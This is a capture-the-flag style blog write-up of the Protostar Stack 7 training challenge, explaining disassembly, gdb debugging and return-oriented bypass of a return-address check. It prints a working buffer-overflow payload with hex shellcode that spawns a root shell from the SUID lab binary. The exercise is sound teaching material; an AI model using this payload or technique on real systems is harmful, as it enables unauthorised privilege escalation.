---
title: Protostar - Stack 7
date: 2024-02-18 09:38:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack7]
---

Hello H4ck3rs ! Today we will go through [Stack 7](https://exploit.education/protostar/stack-seven/)  which will be the final challenge of stack challenge series in [Protostar Machine](https://exploit.education/protostar) :)


this challenge is about exploiation for stack-overflow , remmeber we can have a bufferoverflow but not every overflow will be that easy to exploit :) as we see in [Stack6 Writeup](/posts/protostar_stack6) the developer want to prevent us exploiting it by restricted return address check but we pass it.

today we will use new technique and we will gain more knowledge as we used to check [Stack 5](/posts/protostar_stack5) , [Stack 6](/posts/protostar_stack6) writeup if you didn,t check it :) because it will help you understanding core concepts we need it in Stack 7

## **Challenge Overview**
- **Challenge Name:** [Stack7](https://exploit.education/protostar/stack-seven/)
- **Machine:** [Protostar](https://exploit.education/protostar)

so let,s pwn our binary :D

<img alt="gif" src="https://media1.tenor.com/m/Tgzf0btPhV4AAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>

### Step 1: Explore Binary

![Stack7 Explore](/assets/img/protostar/stack7-explore.png)

#### Things We Noticed 

- so we check permission for our binary stack7 and we found it containing `SUID` permission ... that,s nice so it be can run as the original owner which is `root` so if we pwn it and get a shell we can get a root shell :D
- it first print `input path please: ` then we enter a string input then it print `got path ` + our string then it closed .. it,s okay for now let,s do static analysis to check it :)

### Step 2: Analysis
<img alt="gif" src="https://media1.tenor.com/m/UpGU2HrXp2kAAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>

#### `main` Function Analysis

let,s diassemble `main` and analyze it

![Stack7 main](/assets/img/protostar/stack7-analysis-main.png)
1. Function Prologue 
- `push   ebp` : save the base pointer.
- `mov    ebp,esp`: set up new base pointer and create new stack frame 
- `and    esp,0xfffffff0`: align the stack

2. Function Call 
- `call   80484c4 <getpath>` : calling function `getpath` at address `0x080484c4` .. so remmeber to analyze this function too :) 
3. Function Epilogue 
- `mov esp,ebp` : restore old stack pointer to it,s value before calling `main` and before `program` create `main` function stack frame, this step is the first step used to destruct stack frame of `main`
- `pop ebp`: restore old base pointer pointer to it,s value before calling `main` and before `program` create `main` function stack frame, this step is the second step used to destruct stack frame of `main` as we say before :)
- `ret` => `pop eip` which will get current value at pointer `esp` and store it in `eip`

so remmeber we found another function with name `getpath`which called inside main so let,s move to analyze this function also :D

<img alt="gif" src="https://media1.tenor.com/m/sNBWPOX0GGQAAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>

#### `getpath` Function Analysis

- disassembling `gethpath` 
![Stack7 getpath](/assets/img/protostar/stack7-analysis-getpath.png)
prepare your self , my friend cause now we will analyze all these shits :)

<img alt="gif" src="https://media1.tenor.com/m/bdZHqRXCJOAAAAAd/assembly-assembler.gif" width="450rem" height="350rem"/>


1. Function Proglue
- `push ebp`  : save base pointer on stack
- `mov ebp, esp`: set up a new base pointer and init new stack frame
- `sub esp, 0x68`: allocate space with `0x68` byte for local variables on stack

2. Function Body
- `mov eax, 0x8048620`:  store value `0x8048620` in `eax`
- `mov DWORD PTR [esp], eax`  : store  eax value at pointer `[esp]`
- `call 80483e4 <printf@plt>` : call `printf` , and i had explained what is `@plt` in [Stack 6 Wrireup](/posts/protostar_stack6) :)
- `mov eax, ds:0x8049780` : store value at address `0x8049780` in `eax`
- `mov DWORD PTR [esp], eax`  : store `[esp]` pointer value  at `eax`
- `call 80483d4 <fflush@plt>` : call `fflush` function
- `lea eax, [ebp-0x4c]`       : load effective address of `[ebp-0x4c]` and store it in eax
- `mov DWORD PTR [esp], eax`  : store `eax` value in `[esp]` Hmmm so it,s like an argument for the function `gets` which will be called in next instruction :) 
- `call 80483a4 <gets@plt>`   : call `gets` function .. Hmmm seem we have a new Overflow again. we love overflow XD
- `mov eax, DWORD PTR [ebp+0x4]` : move value at `[ebp+0x4]`  in  `eax`
- `mov DWORD PTR [ebp-0xc], eax` : store the value in `eax` at `[ebp-0xc]`
- `mov eax, DWORD PTR [ebp-0xc]` : move the value at `[ebp-0xc]` into `eax` 
- `and eax, 0xb0000000`          : do  bitwise `&` between `eax` and  `0xb0000000` .. Hmmm it,s nice like what we see in [Stack 6 getpath function analysis](/posts/protostar_stack6/#getpath-function-analysis) but here it perform `&` operation with other value `0xb0000000` .. Hmmm seems interesting :D 
- `cmp eax, 0xb0000000`          : compare result in `eax` with `0xb0000000` .. notice this too
- `jne 8048524 <getpath+0x60>`  : jump to `0x08048524` if `eax`!=`0xb0000000`  .. notice this also :)
- so if `eax`==`0xb0000000`:
  - `mov eax, 0x8048634`           : store `0x8048634`  in `eax`
  - `mov edx, DWORD PTR [ebp-0xc]`  : store value at `[ebp-0x0c]` in `edx`
  - `mov DWORD PTR [esp+0x4], edx`  : store value in `edx` to stack as argument for `printf`
  - `mov DWORD PTR [esp], eax`      : store value in `eax` to top of stack
  - `call 80483e4 <printf@plt>`    : call `printf` function
  - `mov DWORD PTR [esp], 0x1`     : store value `0x1` to the top of the stack , as argument for function `exit` which will be call next :)
  - `call 80483c4 <_exit@plt>`     : call the `_exit` function .. notice it call `_exit(1)` so as we know if `exit` exited with `0` then it will success else it will be failed .. so it will exit with failure code if `eax`==`0xb0000000` take note of that :)
- if `eax`!=`0xb0000000` continue execuation without exit failure .. interesting :)
  - `mov eax, 0x8048640`           : store  address `0x8048640` in `eax`
  - `lea edx, [ebp-0x4c]`          : load effective address of `[ebp-0x4c]` and store it in `edx`
  - `mov DWORD PTR [esp+0x4], edx` : 
  - `mov DWORD PTR [esp], eax`      : store `eax` value in `[esp]` , it,s argument for `printf` which will be called also in next instruction
  - `call 80483e4 <printf@plt>`    : call `printf` 
  - `lea eax, [ebp-0x4c]`          : load effective address of `[ebp-0x4c]` and store it in `eax`
  - `mov DWORD PTR [esp], eax`      : store `eax` value in `[esp]` .. as we used to , it will be an argument for `strdup` which will be called also in next instruction
  - `call 80483f4 <strdup@plt>`    : call `strdup` 
3. Function Epilogue
- `mov esp, ebp` followed by `pop ebp`, restores the previous stack frame
- `ret`    ; pop return address from stack and store it in `eip` 


so in summary it do the following:
1. call printf to print some message we see in [Stack7 Binary Explore](/posts/protostar_stack7/#step-1-explore-binary)
2. then call `gets` to take input from user 
3. get value at pointer `[ebp-0x0c]`
4. perform `&` betwise operation on it with value `0xb0000000`
5. compare output if it equal to `0xb0000000`
6. if it equal then print some message and `exit` with `fail`
7. else continue and print some message and `exit` with `success`
oh great ! :) .. so let,s check value of `[ebp-0x0c]` during debugging and also check other essentials info that we needed :)


<img alt="gif" src="https://media1.tenor.com/m/VpN_Zidd5F0AAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>


### Step 3: Debugging

first let,s create our fuzz script as we used too :) 
`~/fuzz.py`:
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```
and now let,s open our binary with gdb
![Stack7 gdb](/assets/img/protostar/stack7-gdb-debug.png)
so we disassemble `getpath` function  and break on `mov eax,[ebp-0xc]` to check value of `[ebp-0xc]` which used in conditional branching  and we break `ret` value to check how our fuzz value affect registers , so for now we have 2  breakpoints for now :)

so let,s run our binary with output of `~/fuzz.py` as input for this binary
![Stack7 gdb](/assets/img/protostar/stack7-gdb-debug2.png)
so we hit our first breakpoint at `mov eax,[ebp-0xc]` .. let,s check the value at pointer `[ebp-0x0c]` 
notice that the value was `0x55555555` which represent `UUUU` as ascii notice 
so the following will happend
`mov eax,0x55555555`
and then and eax with `0xb0000000`
so `0x55555555 & 0xb0000000` will equal `0x10000000`
and then check if `0x10000000` != `0xb0000000` which is true 
then execute without `jmp` to `print("some msg") ; exit(1)`
so it will continue execution notice this :)
Hmmm .. continue

![Stack7 gdb](/assets/img/protostar/stack7-gdb-debug3.png)
now we reach `ret` instruction and we execute it 
and we monitor registers we found this 
`eip`=`0x55555555`
`ebp`=`0x54545454`
`esp`=`0xbffff7d0`

Hmmm so `eip` is equal to `0x55555555` which is we found also this value at `[ebp-0x0c]`  
so the developer check if we use any address start with `0xbXXXXXXX` "replaceing `X` with any single digit from `[0-9a-f]`
it will exit(1) with fail 
notice that  else it will work and continue execution

let,s check process memory mappings also 
![Stack7 gdb](/assets/img/protostar/stack7-gdb-debug4.png)
so if we put shellcode at stack which it,s mapping starting with address `0xbffeb000` and we overwrite `eip` with any stack address point to our shellcode  it will fail as we see in first try in [Stack 6 Exploitation ](/posts/protostar_stack6/#step-4-exploitation)
because as you see `esp` = `0xbffff7d0` which so `0xbffff7d0 & 0xb0000000 = 0xb0000000` and the developer make our binary check if return address == `0xb0000000` program will exit as we see before in [Stack 6 exploit test ](/posts/protostar_stack6/#step-4-exploitation)

![Stack6 test](/assets/img/protostar/stack6-exploit-test.png)

and if we try to use `ret2libc` technique it will fail because the `libc` as you see mapped for this proccess from statring address `0xb7e97000`  so `0xb7e97000 & 0xb0000000 = 0xb0000000`

which will failed also... Hmmm so sneaky developer ;)

<img alt="gif" src="https://media1.tenor.com/m/GT41VRym-8MAAAAd/look-smile.gif" width="450rem" height="350rem"/>

so to get a round this we should follow new technique used in modern exploitation also and it called `ROP` i will explain this to u my freind, so don,t worry about it :)

### Step 4: Exploitation 
as i told you now we will use `ROP` technique to bypass this which is stands for `Retrun Oriented Programming`
and it,s defination from wikipedia is :

[Return-oriented programming (ROP)](https://en.wikipedia.org/wiki/Return-oriented_programming) : `is a computer security exploit technique that allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing`

so let,s explain how it work ;)

rop is about override `eip` with pointers to instructions was inside the bianry it self placed in code segment `.text` 
it like `ret2libc` but it,s advanced technique make it the perfect for bypassing exploit protections in modern systems like `DEP/NX` for example :)

you can check also [RAPID7 ROP Explained](https://www.rapid7.com/resources/rop-exploit-explained/)  

let,s start writeing our exploit ;)

#### Exploitation Useing : ROP
remmember from debugging step we have this values for the following registers
`eip`=`0x55555555`
`ebp`=`0x54545454`
`esp`=`0xbffff7d0`
so first let,s search for any `ret` instruction in our binary
we can used that we find in objdump output for `getpath` function 

![Stack7 objdump getpath](/assets/img/protostar/stack7-analysis-getpath.png)

so it was `0x08048544`

let,s prepare our exploit and update fuzz script on : `~/fuzz.py`

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
ebp="TTTT"
eip="\x44\x85\x04\x08" # 0x08048544 point to opcode `c3` which represent `ret` instruction in x86/x86_64 arch
ret="\xd0\xf7\xff\xbf" # 0xbffff7d0 return to our shellcode in stack and execute it
code_to_execute="\xcc"*4 
print(fuzz+ebp+eip+ret+code_to_execute)
```

this do the following:
1. hijack `eip` to jump to `0x08048544` which point to `ret` instruction so it will `pop eip` from stack as we know from [Stack4 Writeup : call instruction theory](/posts/protostar_stack4#step-3-debugging) .. note that `0x08048544 & 0xb0000000` will not equal `0xb0000000` so it will passed and bypass restriced return address role which added by developer
2. `eip` will overwrited again with `0xbfffff7d0` which will point to code to execute
3. it will execute `\xcc` that instruction we have explained it in [Stack5 writeup](/posts/protostar_stack5#step-4-exploitation) it represented by `int 3` and used as `breakpoint` trap instruction 
so let,s run it and see what happended :)
![Stack7 exploit failed](/assets/img/protostar/stack7-exploit-fail.png)

exploit failed :( ? debug with your exploit :D

<img alt="gif" src="https://media1.tenor.com/m/pjUIz6U9hxsAAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>

so let,s fire gdb :D

![Stack7 exploit debug](/assets/img/protostar/stack7-gdb-exploit.png)

so as u see i launch `gdb` with `/opt/protostar/bin/stack7` and i break on `ret` instruction and redirect output of `~/fuzz/py` which is `/tmp/fuzz` to `stack7` stdin 
and run it
and then step to ret instruction to execute it so i check `eip` again found it hold point to `ret` instruction which is in our exploit
so untill now everything is going fine :)
but when i step this `ret` instruction again and check `eip` i found it point to bad instruction as you see in screenshot
so i check value at address `0xbffff7d0` i found it `0xbffff7d0` What ? :) i expect to find code to execute value which will be `\xcc` repaeted four times so i check what the next value to value it holds i found it `0xcccccccc` so now i get it 
remmember :
```py
print(fuzz+ebp+eip+ret+code_to_execute)
```
the ret addrress it self which is `0xbffff7d0` is added with our code_to_execute
so `esp` which is also `0xbffff7d0` now point to `0xbffff7d0`+code_to_execute
but we need  to execute only our code so we will add `4` to this address to step this address which is `4 byte` size and make it point at our code to execute
so let,s update new return address `0xbffff7d0` to `0xbffff7d4`
modify our exploit at : `~/fuzz.py`
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
ebp="TTTT"
eip="\x44\x85\x04\x08" # 0x08048544 point to opcode `c3` which represent `ret` instruction in x86/x86_64 arch
ret="\xd4\xf7\xff\xbf" # 0xbffff7d4 return to our shellcode in stack and execute it
code_to_execute="\xcc"*4 
print(fuzz+ebp+eip+ret+code_to_execute)
```

then let,s test our exploit again :)

![Stack7 exploit debug](/assets/img/protostar/stack7-exploit-success.png)

Yeees !!! our code executed successfully and it triggered a breakpoint trap XD

<img alt="gif" src="https://media1.tenor.com/m/PD2HwZpAkXMAAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>


so, as we used too .. it,s time to get our dirty epic root shell ;)

so let,s update our exploit
so i will use my previous custom shellcode that i used in [Stack5 Writeup](/posts/protostar_stack5) which will print `[+] Pwned By Sysc4ll3r` then run `seteuid(geteuid(),geteuid())` and `execve("//bin/sh")`

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
ebp="TTTT"
eip="\x44\x85\x04\x08" # 0x08048544 point to opcode `c3` which represent `ret` instruction in x86/x86_64 arch
ret="\xd4\xf7\xff\xbf" # 0xbffff7d4 return to our shellcode in stack and execute it
code_to_execute=(
"\x68\x33\x72\x20\x23\x68\x63\x34\x6c\x6c\x68\x20\x53\x79\x73\x68\x64\x20\x42\x79"
"\x68\x50\x77\x6e\x65\x68\x5b\x2b\x5d\x20\x31\xdb\x31\xc9\x31\xd2\x6a\x04\x58\xb3"
"\x01\x89\xe1\xb2\x18\xcd\x80\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd"
"\x80\x31\xc0\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x6a\x0b\x58\xcd\x80"
)
print(fuzz+ebp+eip+ret+code_to_execute)
```

so update our exploit and let,s run it ;)

![Stack7 exploit success](/assets/img/protostar/stack7-solved.png)

for now i am not `Sysc4ll3r` just call me `root` XD

<img alt="gif" src="https://media1.tenor.com/m/3Zjn_pGLNEkAAAAd/live-free-or-die-hard-die-hard4.gif" width="450rem" height="350rem"/>


## Finally

today we have finished the latest stack challenge on [Protostar Machine](https://exploit.education/protostar)

Tip : practice all what we learn in [Stack5](/posts/protostar_stack5) , [Stack6](/posts/protostar_stack6) , [Stack7](/posts/protostar_stack7) on `stack0`,`stack1`,`stack2`,`stack3`,`stack4` binaries and get root shell on them to be a good stack smasher ;)

i hope these writeup series to be useful for u :)

thanks for reading <3 

Hack the planet <3

<img alt="gif"  src="https://media1.tenor.com/m/K8R7LThju04AAAAd/hack-the-planet.gif" width="500rem" height="100rem" /> 



